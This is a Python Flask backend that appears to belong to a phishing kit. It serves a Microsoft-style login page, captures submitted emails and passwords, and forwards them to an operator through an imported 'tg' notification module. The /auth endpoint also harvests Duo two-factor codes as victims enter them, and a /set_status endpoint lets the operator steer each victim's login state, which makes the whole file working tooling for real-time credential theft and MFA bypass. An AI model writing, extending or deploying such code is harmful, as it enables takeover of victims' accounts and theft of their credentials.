from flask import Flask, request
from flask import render_template, send_from_directory,  redirect, Response

from models import Email_statuses
from flask_cors import CORS

from dotenv import load_dotenv
from tg import send_notification, get_status_update

load_dotenv()
import os

hosted_url = os.getenv("HOSTED_URL")


app = Flask(__name__, static_folder='microsoft_login/build')

CORS(app)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    if path in ["vcards", "editor"]:
        if not verify_shopify_request_path(request):
            return {"status":"error", "message":"unauthorized"}, 401

    if path != "" and os.path.exists(app.static_folder + '/' + path):
        return send_from_directory(app.static_folder, path)
    else:
        return send_from_directory(app.static_folder, 'index.html')


@app.get("/set_status/<email>/<status>")
def set_status(email, status):
    try:
        Email_statuses.update_one(
            {"email": email.strip()},
            {"$set": {"status": status}},
            upsert=True
        )  
        return {"status":"success", "message":f"Status updated for {email} as {status}"}
    except Exception as e:
        return {"status":"error", "message":str(e)}



@app.post("/auth")
def auth():
    # 1. Get incoming data from the frontend request
    req = request.json
    email = req['email'].strip()
    password = req['password']
    # Safely get the duoCode, which might be an empty string or None
    incoming_duo_code = req.get('duoCode')

    # 2. Fetch the current user record from the database
    db_record = Email_statuses.find_one({"email": email})

    # --- Logic Block 1: Handle new users or changed passwords ---
    # If there's no record or the password differs, it's a new login attempt.
    if not db_record or db_record.get('password') != password:
        # Notify operator of the new email/password combination
        get_status_update(email, password)
        
        # Save the new credentials and reset the state
        Email_statuses.update_one(
            {"email": email},
            {"$set": {
                "password": password,
                "status": "pending",
                "duoCode": None  # Clear any old Duo code from a previous attempt
            }},
            upsert=True
        )
        return {"status": "pending"}

    # --- Logic Block 2: Handle Duo Code Submission ---
    # This block runs only if the password matches.
    # We check if a new, non-empty Duo code has been provided.
    stored_duo_code = db_record.get('duoCode')
    if incoming_duo_code and incoming_duo_code != stored_duo_code:
        # A new Duo code has been submitted. Notify the operator.
        send_notification(f"Duo Code received for {email}: {incoming_duo_code}")

        # Save the new code to the DB and keep the user polling
        Email_statuses.update_one(
            {"email": email},
            {"$set": {
                "status": "pending",  # Keep the user on a waiting screen
                "duoCode": incoming_duo_code
            }}
        )
        return {"status": "pending"}

    # --- Logic Block 3: Handle Standard Polling ---
    # If the password matches and no new Duo code was submitted,
    # this is a standard poll. Do not send any notification.
    # Simply return the current status from the database.
    return {"status": db_record['status']}



@app.post("/alert")
def alert():
    req = request.json
    message = req['message']
    send_notification(message)
    return {"status":"success", "message":"A new job came in"}



if __name__ == '__main__':
    app.run(debug=True)